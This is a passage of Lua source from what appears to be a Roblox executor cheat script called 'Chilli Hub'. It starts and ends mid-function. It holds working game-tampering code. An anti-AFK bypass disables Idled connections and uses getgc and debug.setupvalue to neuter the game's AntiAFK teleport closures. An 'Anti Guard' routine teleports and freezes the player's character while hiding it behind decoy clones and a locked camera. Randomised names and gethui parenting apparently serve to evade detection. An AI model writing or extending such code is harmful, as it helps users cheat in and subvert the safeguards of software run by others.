			if not (v21 and input == v21 or not v21 and input.UserInputType == Enum.UserInputType.MouseMovement) then
				return
			end
			local n20 = Vector2.new(input.Position.X, input.Position.Y) - vector2
			frame.Position = UDim2.new(position.X.Scale, position.X.Offset + n20.X, position.Y.Scale, position.Y.Offset + n20.Y)
		end)

		tbl15[#tbl15 + 1] = UserInputService.InputEnded:Connect(function(input)
			if not flag4 then
				return
			end

			if v21 and input == v21 or not v21 and input.UserInputType == Enum.UserInputType.MouseButton1 then
				flag4 = false
				v21 = nil
				position = nil

				if frame then
					fn16(frame.Position)
				end
			end
		end)

		tbl15[#tbl15 + 1] = RunService.RenderStepped:Connect(function(deltaTime)
			if not flag3 or not v17 then
				return
			end
			local n20 = math.clamp(deltaTime, 0.001, 1)
			local n21 = 1 / n20

			if n18 <= 0 then
				n18 = n21
			else
				n18 += (n21 - n18) * (1 - math.exp(-n20 * n16))
			end

			local now = os.clock()
			if now < n19 then
				return
			end
			n19 = now + n15
			local n22 = math.floor(n18 + 0.5)
			local text = tostring(n22)

			if text ~= v19 then
				v19 = text
				v17.Text = text
				v17.TextColor3 = fn17(n22)
			end

			local n23 = 0

			pcall(function()
				n23 = Stats.Network.ServerStatsItem["Data Ping"]:GetValue()
			end)

			local n24 = math.floor(n23 + 0.5)
			local text2 = tostring(n24)

			if text2 ~= v20 then
				v20 = text2
				v18.Text = text2
				v18.TextColor3 = fn18(n24)
			end
		end)
	end

	v15:CreateSlider({
		Name = "FPS and Ping Size",
		Min = 60,
		Max = 160,
		Default = 100,
		AllowDecimals = false,
		Increment = 1,
		Unit = "%",
		SubOf = v15:CreateToggle({
			Name = "FPS and Ping",
			Default = true,
			Callback = function(arg)
				flag3 = arg == true

				if flag3 then
					fn21()
				else
					fn20()
				end
			end,
		}),
		Callback = function(arg)
			n17 = math.clamp((tonumber(arg) or 100) / 100, 0.6, 1.6)
			fn19()
		end,
	})

	fn4(fn20)
end

do
	local v16 = v14:CreateSection({ Name = "Utility", Expanded = true })
	local tbl15 = { Enabled = true, Alive = true, Silenced = {} }

	local function fn15()
		if type(getconnections) ~= "function" then
			return {}
		end
		local ok, result = pcall(getconnections, localPlayer.Idled)
		return ok and type(result) == "table" and result or {}
	end

	local function fn16()
		for _, v17 in ipairs(fn15()) do
			if pcall(function()
				v17:Disable()
			end) then
				tbl15.Silenced[#tbl15.Silenced + 1] = v17
			end
		end
	end

	local function fn17()
		local silenced = tbl15.Silenced

		if #silenced == 0 then
			silenced = fn15()
		end

		for _, v17 in ipairs(silenced) do
			pcall(function()
				v17:Enable()
			end)
		end

		table.clear(tbl15.Silenced)
	end

	local obj = setmetatable({}, { __index = function()
		return function()
		end
	end })

	local tbl16 = {}

	local function fn18()
		local tbl17 = {}
		if type(getgc) ~= "function" or type(debug) ~= "table" or type(debug.getupvalues) ~= "function" then
			return tbl17
		end
		local ok, result = pcall(getgc, false)
		if not ok or type(result) ~= "table" then
			return tbl17
		end

		for _, v17 in ipairs(result) do
			if type(v17) == "function" and islclosure(v17) then
				local ok2, result2 = pcall(debug.info, v17, "s")

				if ok2 and type(result2) == "string" and string.find(result2, "AntiAFK", 1, true) then
					local ok3, result3 = pcall(debug.getupvalues, v17)

					if ok3 and type(result3) == "table" then
						for k, v18 in pairs(result3) do
							if typeof(v18) == "Instance" and v18.ClassName == "TeleportService" then
								tbl17[#tbl17 + 1] = { Fn = v17, Index = k, Original = v18 }
							end
						end
					end
				end
			end
		end

		return tbl17
	end

	local function fn19()
		for _, v17 in ipairs(fn18()) do
			local ok, result = pcall(debug.getupvalue, v17.Fn, v17.Index)

			if ok and typeof(result) == "Instance" then
				if pcall(debug.setupvalue, v17.Fn, v17.Index, obj) then
					tbl16[#tbl16 + 1] = v17
				end
			end
		end
	end

	local function fn20()
		for _, v17 in ipairs(tbl16) do
			pcall(debug.setupvalue, v17.Fn, v17.Index, v17.Original)
		end

		table.clear(tbl16)
	end

	local function fn21()
		fn16()

		if #tbl16 == 0 then
			fn19()
		end
	end

	local connection = localPlayer.CharacterAdded:Connect(function()
		task.delay(1, function()
			if tbl15.Alive and tbl15.Enabled then
				table.clear(tbl15.Silenced)
				pcall(fn21)
			end
		end)
	end)

	fn4(function()
		pcall(function()
			connection:Disconnect()
		end)
	end)

	fn4(function()
		tbl15.Alive = false
		fn17()
		fn20()
	end)

	task.spawn(function()
		while tbl15.Alive do
			if tbl15.Enabled then
				fn21()
			end

			task.wait(600)
		end
	end)

	v16:CreateToggle({
		Name = "Anti AFK",
		Default = true,
		Callback = function(arg)
			tbl15.Enabled = arg ~= false

			if tbl15.Enabled then
				fn21()
			else
				fn17()
				fn20()
			end
		end,
	})
end

local GuiService2, StarterGui, antiGuard, tbl15, chilliAntiGuard, tbl16, tbl17, n13, flag3, tbl18
local tbl19, fn15, hui, fn16, ScreenGui, Frame, UIScale, Frame2, UIScale2, fn17

do
	local TweenService = game:GetService("TweenService")
	GuiService2 = game:GetService("GuiService")
	StarterGui = game:GetService("StarterGui")
	antiGuard = tbl3.AntiGuard

	tbl15 = {
		Target = "line",
		LineOffset = 8,
		Height = 45,
		OffsetX = -90,
		OffsetZ = -35,
		Jitter = 0,
		Point = false,
		Disguise = true,
		Limp = true,
		Facing = "Zero",
		Freeze = false,
		StartAt = 0,
		Steps = {
			{ At = 0.1, To = "home" },
			{ At = 0.33, To = "home" },
			{ At = 0.56, To = "home" },
			{ At = 0.75, To = "start" },
		},
		ReleaseAt = 0.8,
		WeldScanGap = 0.03,
		BusyLimit = 2.5,
	}

	local function fn18(arg, arg2, arg3, arg4, arg5, arg6)
		local tbl20 = {}

		for i = 1, arg do
			tbl20[#tbl20 + 1] = { At = arg2 + arg3 * (i - 1), To = "home" }
		end

		tbl20[#tbl20 + 1] = { At = arg4, To = "start" }

		return {
			Target = "home",
			LineOffset = 8,
			Height = 0,
			OffsetX = 0,
			OffsetZ = 0,
			Jitter = 0,
			Point = false,
			Disguise = true,
			Limp = false,
			Facing = "Zero",
			Freeze = true,
			StartAt = 0,
			StartRandom = 0,
			HopRandom = 0.085,
			HoldRandom = 0.395,
			Steps = tbl20,
			ReleaseAt = arg5,
			WeldScanGap = 0.03,
			BusyLimit = arg6,
		}
	end

	chilliAntiGuard = { LightDark = tbl15, Default = fn18(25, 0, 0.05, 1.27, 1.52, 2.5) }

	pcall(function()
		getgenv().ChilliAntiGuard = chilliAntiGuard
	end)

	tbl16 = {
		Card = Color3.fromRGB(15, 15, 19),
		CardTop = Color3.fromRGB(24, 22, 28),
		Stroke = Color3.fromRGB(48, 46, 56),
		Text = Color3.fromRGB(240, 238, 244),
		AccentA = Color3.fromRGB(255, 72, 72),
		AccentB = Color3.fromRGB(255, 150, 60),
		Good = Color3.fromRGB(80, 220, 140),
		Work = Color3.fromRGB(255, 190, 70),
		Bad = Color3.fromRGB(240, 90, 90),
		Off = Color3.fromRGB(58, 56, 66),
	}

	tbl17 = {
		{ Path = { "GearGiver_Slap", "Podium" }, Offset = Vector3.new(-16.415, 21.072, -6.106) },
		{
			Path = { "World", "Machines", "RiftMachine", "Rift", "Meshes/VoidPortal_Cube.003" },
			Offset = Vector3.new(-26.776, 1.75, 18.665),
		},
		{
			Path = { "__OBJECTS", "Machines", "RiftMachine", "Rift", "Meshes/VoidPortal_Cube.003" },
			Offset = Vector3.new(-26.776, 1.75, 18.665),
		},
	}

	n13 = 52
	flag3 = true
	tbl18 = {}

	tbl19 = {
		AreaId = nil,
		SignalCarrying = false,
		WeldCarrying = false,
		Carrying = false,
		Active = false,
		Disguise = nil,
		FlashRequest = nil,
		FlashUntil = 0,
	}

	fn15 = function()
		local tbl20 = {}

		for i = 1, math.random(10, 16) do
			tbl20[i] = string.char(math.random(97, 122))
		end

		return table.concat(tbl20)
	end

	hui = nil

	pcall(function()
		hui = gethui()
	end)

	hui = hui or CoreGui

	local function fn19(arg, parent, arg2)
		local instance = Instance.new(arg)
		instance.Name = fn15()
		local v16 = pairs
		local tbl20 = arg2 or {}

		for k, v17 in v16(tbl20) do
			instance[k] = v17
		end

		instance.Parent = parent
		return instance
	end

	fn16 = function(arg, arg2, arg3, arg4)
		local ok, result = pcall(function()
			local v16 = TweenService
			local create = v16.Create
			local tweenInfo = TweenInfo.new
			local v17 = arg4
			local quint

			if arg4 then
				quint = v17
			else
				quint = Enum.EasingStyle.Quint
			end

			return create(v16, arg, tweenInfo(arg2, quint, Enum.EasingDirection.Out), arg3)
		end)

		if ok and result then
			result:Play()
		end
	end

	ScreenGui = fn19("ScreenGui", nil, {
		ResetOnSpawn = false,
		IgnoreGuiInset = true,
		DisplayOrder = -100,
		ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
	})

	Frame = fn19("Frame", ScreenGui, {
		AnchorPoint = Vector2.new(0.5, 0.5),
		Position = UDim2.new(0.5, 0, 1, -120),
		Size = UDim2.fromOffset(226, 52),
		BackgroundTransparency = 1,
	})

	UIScale = fn19("UIScale", Frame, { Scale = 1 })

	Frame2 = fn19("Frame", Frame, {
		Size = UDim2.fromScale(1, 1),
		BackgroundColor3 = tbl16.Card,
		BorderSizePixel = 0,
		Active = true,
	})

	fn19("UICorner", Frame2, { CornerRadius = UDim.new(0, 14) })
	UIScale2 = fn19("UIScale", Frame2, { Scale = 0.86 })
	fn19("UIGradient", Frame2, { Color = ColorSequence.new(tbl16.CardTop, tbl16.Card), Rotation = 90 })

	local UIStroke = fn19("UIStroke", Frame2, {
		Thickness = 1.5,
		Color = Color3.fromRGB(255, 255, 255),
		Transparency = 0.2,
		ApplyStrokeMode = Enum.ApplyStrokeMode.Border,
	})

	local UIGradient = fn19("UIGradient", UIStroke, { Color = ColorSequence.new(tbl16.Stroke, tbl16.Stroke) })

	local Frame3 = fn19("Frame", Frame2, {
		AnchorPoint = Vector2.new(0, 0.5),
		Position = UDim2.new(0, 10, 0.5, 0),
		Size = UDim2.fromOffset(36, 36),
		BackgroundColor3 = Color3.fromRGB(28, 26, 32),
		BorderSizePixel = 0,
		ZIndex = 2,
	})

	fn19("UICorner", Frame3, { CornerRadius = UDim.new(0, 11) })
	local UIStroke2 = fn19("UIStroke", Frame3, { Thickness = 1.5, Color = tbl16.Off, ApplyStrokeMode = Enum.ApplyStrokeMode.Border })

	local ImageLabel = fn19("ImageLabel", Frame3, {
		AnchorPoint = Vector2.new(0.5, 0.5),
		Position = UDim2.fromScale(0.5, 0.5),
		Size = UDim2.fromScale(0.86, 0.86),
		BackgroundTransparency = 1,
		Image = "rbxassetid://128961717706452",
		ImageTransparency = 0.35,
		ScaleType = Enum.ScaleType.Crop,
		ZIndex = 3,
	})

	fn19("UICorner", ImageLabel, { CornerRadius = UDim.new(0, 8) })
	local UIScale3 = fn19("UIScale", ImageLabel, { Scale = 1 })
	local color3 = Color3.fromRGB

	fn19("UIGradient", fn19("TextLabel", Frame2, {
		BackgroundTransparency = 1,
		Position = UDim2.new(0, 56, 0, 7),
		Size = UDim2.new(1, -112, 0, 15),
		Font = Enum.Font.BuilderSansExtraBold,
		TextSize = 14,
		TextXAlignment = Enum.TextXAlignment.Left,
		TextColor3 = Color3.fromRGB(255, 255, 255),
		Text = "Chilli Hub",
		ZIndex = 2,
	}), { Color = ColorSequence.new(Color3.fromRGB(255, 120, 100), color3(255, 190, 110)) })

	fn19("TextLabel", Frame2, {
		BackgroundTransparency = 1,
		Position = UDim2.new(0, 56, 0, 22),
		Size = UDim2.new(1, -112, 0, 20),
		Font = Enum.Font.GothamBlack,
		TextSize = 15,
		TextXAlignment = Enum.TextXAlignment.Left,
		TextColor3 = tbl16.Text,
		Text = "Anti Guard",
		ZIndex = 2,
	})

	local TextButton = fn19("TextButton", Frame2, {
		AnchorPoint = Vector2.new(1, 0.5),
		Position = UDim2.new(1, -12, 0.5, 0),
		Size = UDim2.fromOffset(42, 22),
		BackgroundColor3 = Color3.fromRGB(255, 255, 255),
		AutoButtonColor = false,
		BorderSizePixel = 0,
		Text = "",
		ZIndex = 2,
	})

	fn19("UICorner", TextButton, { CornerRadius = UDim.new(1, 0) })
	local UIGradient2 = fn19("UIGradient", TextButton, { Color = ColorSequence.new(tbl16.Off, tbl16.Off) })

	local Frame4 = fn19("Frame", TextButton, {
		AnchorPoint = Vector2.new(0, 0.5),
		Position = UDim2.new(0, 3, 0.5, 0),
		Size = UDim2.fromOffset(16, 16),
		BackgroundColor3 = Color3.fromRGB(245, 245, 250),
		BorderSizePixel = 0,
		ZIndex = 3,
	})

	fn19("UICorner", Frame4, { CornerRadius = UDim.new(1, 0) })

	local function fn20()
		return antiGuard.Enabled and tbl16.AccentA or tbl16.Off
	end

	local function render(arg)
		local n14 = arg and 0 or 0.28

		if antiGuard.Enabled then
			UIGradient2.Color = ColorSequence.new(tbl16.AccentA, tbl16.AccentB)
			local v16 = UIGradient
			local colorSequence = ColorSequence.new
			local tbl20 = {}
			local v17 = ColorSequenceKeypoint.new(0, tbl16.Stroke)
			local v18 = ColorSequenceKeypoint.new(0.45, tbl16.AccentA)
			local v19 = ColorSequenceKeypoint.new(0.55, tbl16.AccentB)
			tbl20[1] = v17
			tbl20[2] = v18
			tbl20[3] = v19

			do
				local values = table.pack(ColorSequenceKeypoint.new(1, tbl16.Stroke))
				table.move(values, 1, values.n, 4, tbl20)
			end

			v16.Color = colorSequence(tbl20)
			fn16(Frame4, n14, { Position = UDim2.new(1, -19, 0.5, 0) }, Enum.EasingStyle.Back)
			fn16(ImageLabel, n14, { ImageTransparency = 0 })
			fn16(UIStroke, 0.3, { Transparency = 0 })
		else
			UIGradient2.Color = ColorSequence.new(tbl16.Off, tbl16.Off)
			UIGradient.Color = ColorSequence.new(tbl16.Stroke, tbl16.Stroke)
			fn16(Frame4, n14, { Position = UDim2.new(0, 3, 0.5, 0) }, Enum.EasingStyle.Back)
			fn16(ImageLabel, n14, { ImageTransparency = 0.35 })
			fn16(UIStroke, 0.3, { Transparency = 0.2 })
		end

		local flashUntil = tbl19.FlashUntil

		if os.clock() >= flashUntil then
			fn16(UIStroke2, n14, { Color = fn20() })
		end
	end

	fn17 = function(arg, arg2)
		tbl19.FlashRequest = { Color = arg, Hold = arg2 }
	end

	local function fn21()
		local flashRequest = tbl19.FlashRequest
		if not flashRequest then
			return
		end
		tbl19.FlashRequest = nil
		tbl19.FlashUntil = os.clock() + (flashRequest.Hold or 0)
		fn16(UIStroke2, 0.2, { Color = flashRequest.Color })

		if flashRequest.Hold then
			task.delay(flashRequest.Hold, function()
				local flag4 = flag3

				if flag3 then
					local flashUntil = tbl19.FlashUntil
					flag4 = os.clock() >= flashUntil
				end

				if flag4 then
					fn16(UIStroke2, 0.3, { Color = fn20() })
				end
			end)
		end
	end

	local function fn22(arg)
		local handle = antiGuard.Handle
		if type(handle) ~= "table" then
			return
		end

		for _, v16 in ipairs({ "Set", "SetValue" }) do
			local ok, result = pcall(function()
				return handle[v16]
			end)

			if ok and type(result) == "function" and pcall(result, handle, arg) then
				return
			end
		end
	end

	antiGuard.Render = render

	local TextButton2 = fn19("TextButton", Frame2, {
		Size = UDim2.fromScale(1, 1),
		BackgroundTransparency = 1,
		AutoButtonColor = false,
		Text = "",
		ZIndex = 10,
	})

	tbl18[#tbl18 + 1] = TextButton2.MouseButton1Click:Connect(function()
		antiGuard.Enabled = not antiGuard.Enabled
		render(false)
		fn22(antiGuard.Enabled)
		fn16(UIScale3, 0.12, { Scale = 1.15 })

		task.delay(0.12, function()
			if flag3 then
				fn16(UIScale3, 0.3, { Scale = 1 }, Enum.EasingStyle.Back)
			end
		end)
	end)

	local size = TextButton.Size

	tbl18[#tbl18 + 1] = TextButton2.MouseEnter:Connect(function()
		fn16(TextButton, 0.15, { Size = size + UDim2.fromOffset(2, 2) })
	end)

	tbl18[#tbl18 + 1] = TextButton2.MouseLeave:Connect(function()
		fn16(TextButton, 0.15, { Size = size })
	end)

	local tbl20 = {
		Hotbar = true,
		HotBar = true,
		Toolbar = true,
		ToolBar = true,
		Backpack = true,
		Inventory = true,
	}

	local tbl21 = {}
	local huge = math.huge
	local huge2 = math.huge
	local rotation = 0
	local n14 = nil

	local function fn23(arg)
		while arg do
			if arg:IsA("GuiObject") and not arg.Visible then
				return false
			end

			if arg:IsA("LayerCollector") then
				return arg.Enabled
			end
			arg = arg.Parent
		end

		return false
	end

	local function fn24()
		local ok, result = pcall(function()
			return GuiService2:GetGuiInset().Y
		end)

		return ok and result or 0
	end

	local function fn25(arg)
		local v16 = nil

		for _, descendant in ipairs(arg:GetDescendants()) do
			if descendant:IsA("GuiButton") and descendant.Visible and descendant.AbsoluteSize.Y > 8 and descendant.AbsoluteSize.X > 8 then
				local y = descendant.AbsolutePosition.Y

				if not v16 or y < v16 then
					v16 = y
				end
			end
		end

		return v16 or arg.AbsolutePosition.Y
	end

	local function fn26()
		table.clear(tbl21)
		local playerGui = localPlayer:FindFirstChildOfClass("PlayerGui")
		if not playerGui then
			return
		end

		for _, descendant in ipairs(playerGui:GetDescendants()) do
			if descendant:IsA("GuiObject") and tbl20[descendant.Name] then
				tbl21[#tbl21 + 1] = descendant
			end
		end
	end

	local function fn27()
		local tbl22 = {}

		pcall(function()
			if not StarterGui:GetCoreGuiEnabled(Enum.CoreGuiType.Backpack) then
				return
			end

			for _, child in ipairs(CoreGui.RobloxGui.Backpack:GetChildren()) do
				if child:IsA("GuiObject") then
					tbl22[#tbl22 + 1] = child
				end
			end
		end)

		for _, v16 in ipairs(tbl21) do
			if v16.Parent then
				tbl22[#tbl22 + 1] = v16
			end
		end

		return tbl22
	end

	local function fn28()
		local currentCamera = workspace.CurrentCamera
		if not currentCamera then
			return
		end
		local viewportSize = currentCamera.ViewportSize
		if viewportSize.X < 10 or viewportSize.Y < 10 then
			return
		end
		local flag4 = UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled
		local n15 = math.min(viewportSize.X / 1280, viewportSize.Y / 720)
		local scale = flag4 and math.clamp(n15 * 1.05, 0.6, 0.8) * 0.97 or math.clamp(n15, 0.8, 1.1)
		UIScale.Scale = scale
		local backgroundTransparency = flag4 and 0.3 or 0

		if Frame2.BackgroundTransparency ~= backgroundTransparency then
			Frame2.BackgroundTransparency = backgroundTransparency
			Frame3.BackgroundTransparency = backgroundTransparency
		end

		local n16 = viewportSize.Y - 8 * scale
		local flag5 = false

		for _, v16 in ipairs(fn27()) do
			local ok, result = pcall(fn23, v16)

			if ok and result then
				local absoluteSize = v16.AbsoluteSize
				local y = v16.AbsolutePosition.Y

				if absoluteSize.X > 20 and absoluteSize.Y > 20 and absoluteSize.Y < viewportSize.Y * 0.4 and y + absoluteSize.Y / 2 > viewportSize.Y * 0.5 then
					local ok2, result2 = pcall(fn25, v16)
					result2 = ok2 and result2 or y
					flag5 = true
					n16 = math.min(n16, result2 + fn24(v16))
				end
			end
		end

		if flag5 then
			n14 = viewportSize.Y - n16
		elseif n14 then
			n16 = viewportSize.Y - n14
		end

		local n17 = math.max(n16 - (flag4 and 4 or 6) * scale - n13 * scale / 2, n13 * scale / 2 + 8)
		Frame.Position = UDim2.new(0.5, 0, 0, n17)
	end

	tbl18[#tbl18 + 1] = RunService.RenderStepped:Connect(function(deltaTime)
		fn21()
		huge += deltaTime
		huge2 += deltaTime

		if huge >= 3 then
			huge = 0
			pcall(fn26)
		end

		if huge2 >= 0.2 then
			huge2 = 0
			pcall(fn28)
		end

		if antiGuard.Enabled then
			rotation = (rotation + deltaTime * (tbl19.Active and 360 or 90)) % 360
			UIGradient.Rotation = rotation
		end
	end)

	render(true)
end

antiGuard.ShowPanel = function(arg)
	ScreenGui.Enabled = arg == true
end

ScreenGui.Enabled = antiGuard.PanelShown == true
ScreenGui.Parent = hui
fn16(UIScale2, 0.45, { Scale = 1 }, Enum.EasingStyle.Back)

do
	local function fn18()
		local v16 = tbl3.Root()
		if not v16 then
			return nil
		end

		for _, child in ipairs(workspace:GetChildren()) do
			if child:IsA("Model") and child:FindFirstChild("Hitbox") then
				for _, descendant in ipairs(child:GetDescendants()) do
					if descendant:IsA("JointInstance") or descendant:IsA("WeldConstraint") or descendant:IsA("RigidConstraint") then
						local ok, result, result2 = pcall(function()
							return descendant.Part0, descendant.Part1
						end)

						if ok and (result == v16 or result2 == v16) then
							return child
						end
					end
				end
			end
		end

		return nil
	end

	local function fn19(arg, parent)
		local tbl20 = {}

		for _, descendant in ipairs(arg:GetDescendants()) do
			tbl20[descendant] = descendant.Archivable

			pcall(function()
				descendant.Archivable = true
			end)
		end

		local archivable = arg.Archivable
		arg.Archivable = true

		local ok, result = pcall(function()
			return arg:Clone()
		end)

		arg.Archivable = archivable

		for k, v16 in pairs(tbl20) do
			pcall(function()
				k.Archivable = v16
			end)
		end

		if not ok or not result then
			return nil
		end
		result.Name = fn15()

		for _, descendant in ipairs(result:GetDescendants()) do
			if descendant:IsA("LuaSourceContainer") or descendant:IsA("Sound") or descendant:IsA("ForceField") or descendant:IsA("JointInstance") or descendant:IsA("Constraint") or descendant:IsA("WeldConstraint") or descendant:IsA("BodyMover") or descendant:IsA("ProximityPrompt") or descendant:IsA("BillboardGui") then
				pcall(function()
					descendant:Destroy()
				end)
			elseif descendant:IsA("BasePart") then
				descendant.Anchored = true
				descendant.CanCollide = false
				descendant.CanQuery = false
				descendant.CanTouch = false
			elseif descendant:IsA("Humanoid") then
				descendant.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None
				descendant.HealthDisplayType = Enum.HumanoidHealthDisplayType.AlwaysOff
			end
		end

		result.Parent = parent
		return result
	end

	local function fn20(arg, arg2)
		local currentCamera = workspace.CurrentCamera
		if not arg or not currentCamera or tbl19.Disguise then
			return
		end
		arg2 = arg2 or Vector3.zero
		local disguise = { Camera = currentCamera, CameraType = currentCamera.CameraType, CameraCFrame = currentCamera.CFrame, Copies = {}, Hidden = {} }
		tbl19.Disguise = disguise
		local tbl20 = { arg }
		local ok, result = pcall(fn18)

		if ok and result then
			tbl20[#tbl20 + 1] = result
		end

		for _, v16 in ipairs(tbl20) do
			for _, descendant in ipairs(v16:GetDescendants()) do
				if descendant:IsA("BasePart") or descendant:IsA("Decal") or descendant:IsA("Texture") then
					disguise.Hidden[#disguise.Hidden + 1] = descendant
				end
			end
		end

		local function fn21()
			for _, v16 in ipairs(disguise.Hidden) do
				pcall(function()
					v16.LocalTransparencyModifier = 1
				end)
			end

			pcall(function()
				if currentCamera.CameraType ~= Enum.CameraType.Scriptable then
					currentCamera.CameraType = Enum.CameraType.Scriptable
				end

				currentCamera.CFrame = disguise.CameraCFrame
			end)
		end

		fn21()
		disguise.BindName = fn15()

		if not pcall(function()
			RunService:BindToRenderStep(disguise.BindName, Enum.RenderPriority.Last.Value + 1, fn21)
		end) then
			disguise.BindName = nil
			disguise.Link = RunService.RenderStepped:Connect(fn21)
		end

		disguise.Beat = RunService.Heartbeat:Connect(fn21)

		for _, v16 in ipairs(tbl20) do
			local ok2, result2 = pcall(fn19, v16, currentCamera)

			if ok2 and result2 then
				if arg2.Magnitude > 0.01 then
					for _, descendant in ipairs(result2:GetDescendants()) do
						if descendant:IsA("BasePart") then
							pcall(function()
								descendant.CFrame = descendant.CFrame + arg2
							end)
						end
					end
				end

				disguise.Copies[#disguise.Copies + 1] = result2
			end
		end
	end

	local function fn21()
		local disguise = tbl19.Disguise
		if not disguise then
			return
		end
		tbl19.Disguise = nil

		if disguise.BindName then
			pcall(function()
				RunService:UnbindFromRenderStep(disguise.BindName)
			end)
		end

		if disguise.Link then
			pcall(function()
				disguise.Link:Disconnect()
			end)
		end

		if disguise.Beat then
			pcall(function()
				disguise.Beat:Disconnect()
			end)
		end

		for _, v16 in ipairs(disguise.Hidden) do
			pcall(function()
				v16.LocalTransparencyModifier = 0
			end)
		end

		pcall(function()
			disguise.Camera.CameraType = disguise.CameraType
		end)

		for _, copy in ipairs(disguise.Copies) do
			pcall(function()
				copy:Destroy()
			end)
		end
	end

	local function fn22()
		for _, v16 in ipairs(tbl17) do
			local v17 = workspace

			for _, v18 in ipairs(v16.Path) do
				v17 = v17 and v17:FindFirstChild(v18) or nil
			end

			if v17 and v17:IsA("BasePart") then
				return v17.CFrame:PointToWorldSpace(v16.Offset)
			end
		end

		return Vector3.new(528.7, 70.57, -364.11)
	end

	local function fn23(arg, arg2, arg3, arg4, arg5)
		local cFrame = CFrame.new(arg3) * arg4

		pcall(function()
			arg:PivotTo(cFrame)
		end)

		if (arg2.Position - arg3).Magnitude > 3 then
			pcall(function()
				arg2.CFrame = cFrame
			end)
		end

		if arg5 == false then
			return
		end

		for _, descendant in ipairs(arg:GetDescendants()) do
			if descendant:IsA("BasePart") then
				pcall(function()
					descendant.AssemblyLinearVelocity = Vector3.zero
					descendant.AssemblyAngularVelocity = Vector3.zero
				end)
			end
		end
	end

	local function fn24()
		local areaId = tbl19.AreaId

		if type(areaId) ~= "string" or areaId == "" then
			areaId = type(tbl3.Steal) == "table" and tbl3.Steal.CarryAreaId or nil
		end

		if type(areaId) ~= "string" or areaId == "" then
			areaId = localPlayer:GetAttribute("AreaId")
			areaId = type(areaId) == "string" and areaId or nil
		end

		return areaId
	end

	local tbl20 = { lightdark = "LightDark" }

	local function fn25(arg)
		if type(arg) ~= "string" then
			return "Default"
		end
		local lower = string.lower
		local v16 = string.gsub(arg, "[^%a]", "")
		return tbl20[lower(v16)] or "Default"
	end

	local function fn26()
		local ok, result = pcall(function()
			return getgenv().ChilliAntiGuard
		end)

		if ok and type(result) == "table" then
			if type(result.Steps) == "table" then
				return result
			end
			local default = result[fn25(fn24())] or result.Default
			if type(default) == "table" then
				return default
			end
		end

		return chilliAntiGuard[fn25(fn24())] or tbl15
	end

	local function fn27(arg, arg2)
		local world = workspace:FindFirstChild("World") or workspace:FindFirstChild("__OBJECTS")
		world = world and world:FindFirstChild("Areas")
		world = world and world:FindFirstChild("SeparationLine")

		if world and world:IsA("BasePart") then
			local cFrame = world.CFrame
			local v16 = (Vector3.new(0, 1, 0)):Cross(world.Size.X >= world.Size.Z and cFrame.RightVector or cFrame.LookVector)
			local vector = Vector3.new(v16.X, 0, v16.Z)

			if vector.Magnitude > 0.001 then
				local unit = vector.Unit
				local n14 = cFrame.Position + ((arg2 - cFrame.Position):Dot(unit) >= 0 and -unit or unit) * (tonumber(arg.LineOffset) or 8)
				return Vector3.new(n14.X, arg2.Y + 0.5, n14.Z)
			end
		end

		return nil
	end

	local function fn28(arg, arg2)
		local str = tostring(arg.Target or "home")
		if str == "sky" then
			return arg2
		end

		if str == "point" then
			if typeof(arg.Point) == "Vector3" then
				return arg.Point
			end
			return arg2
		end

		if str == "line" then
			local v16 = fn27(arg, arg2)
			if v16 then
				return v16
			end
		end

		return fn22()
	end

	local function fn29(arg, arg2)
		return fn28(arg, arg2) + Vector3.new(tonumber(arg.OffsetX) or 0, tonumber(arg.Height) or 0, tonumber(arg.OffsetZ) or 0)
	end

	local function fn30()
		tbl19.Active = false
		antiGuard.Busy = false
	end

	local function fn31(arg)
		local n14 = math.max(tonumber(arg) or 0, 0)
		if n14 <= 0 then
			return 0
		end
		return (math.random() * 2 - 1) * n14
	end

	local function fn32(arg)
		local steps = type(arg.Steps) == "table" and arg.Steps or {}
		local n14 = tonumber(arg.ReleaseAt) or 0
		local n15 = math.max(tonumber(arg.StartAt) or 0, 0)
		local n16 = math.max(tonumber(arg.StartRandom) or 0, 0)
		local n17 = math.max(tonumber(arg.HopRandom) or 0, 0)
		local n18 = math.max(tonumber(arg.HoldRandom) or 0, 0)
		if n16 <= 0 and n17 <= 0 and n18 <= 0 then
			return steps, n14, n15
		end
		local n19 = math.max(n15 + fn31(n16), 0)
		local tbl21 = {}
		local v16, v17, v18 = ipairs(steps)
		local n20 = 0
		local n21 = 0

		for k, v19 in v16, v17, v18 do
			if type(v19) == "table" then
				local n22 = math.max(tonumber(v19.At) or 0, 0)
				n21 = math.max(n21 + math.max(n22 - n20, 0) + fn31(v19.To == "start" and n18 or n17), n19)
				tbl21[k] = { At = n21, To = v19.To, Glide = v19.Glide }
				n20 = n22
				continue
			end

			break
		end

		return tbl21, n21 + math.max(n14 - n20, 0), n19
	end

	local function fn33(arg)
		local character = localPlayer.Character
		local v16 = tbl3.Root()
		local humanoid = character and character:FindFirstChildOfClass("Humanoid")

		if not v16 or not humanoid or humanoid.Health <= 0 then
			fn30()
			fn17(tbl16.Bad, 1.6)
			return
		end

		local function fn34()
			return flag3 and v16.Parent ~= nil and humanoid.Parent ~= nil and humanoid.Health > 0
		end

		local platformStand = humanoid.PlatformStand
		local cFrame = v16.CFrame
		local position = cFrame.Position
		local v17 = fn26()
		local v18, v19, v20 = fn32(v17)
		local flag4 = v17.Freeze ~= false
		local str = tostring(v17.Facing or "Keep")
		local n14 = math.max(tonumber(v17.Jitter) or 0, 0)
		local cframe = str == "Zero" and CFrame.new() or cFrame.Rotation

		local function fn35()
			if str == "Spin" then
				return CFrame.Angles(0, math.rad(math.random(0, 359)), 0)
			end
			return cframe
		end

		local function fn36(arg2)
			if n14 <= 0 then
				return arg2
			end
			return arg2 + Vector3.new((math.random() * 2 - 1) * n14, 0, (math.random() * 2 - 1) * n14)
		end

		local v21 = fn29(v17, position)

		local function fn37(arg2)
			while fn34() and os.clock() - arg < arg2 do
				RunService.Heartbeat:Wait()

				if flag4 then
					pcall(function()
						v16.AssemblyLinearVelocity = Vector3.zero
						v16.AssemblyAngularVelocity = Vector3.zero
					end)
				end
			end

			return fn34()
		end

		local function fn38(arg2, arg3)
			fn23(character, v16, arg2, arg3, flag4)
			RunService.PreSimulation:Wait()

			if fn34() and (v16.Position - arg2).Magnitude > 3 then
				fn23(character, v16, arg2, arg3, flag4)
			end
		end

		pcall(function()
			humanoid.BreakJointsOnDeath = false
		end)

		if v17.Disguise ~= false then
			pcall(fn20, character, Vector3.zero)
		end

		fn17(tbl16.Work)

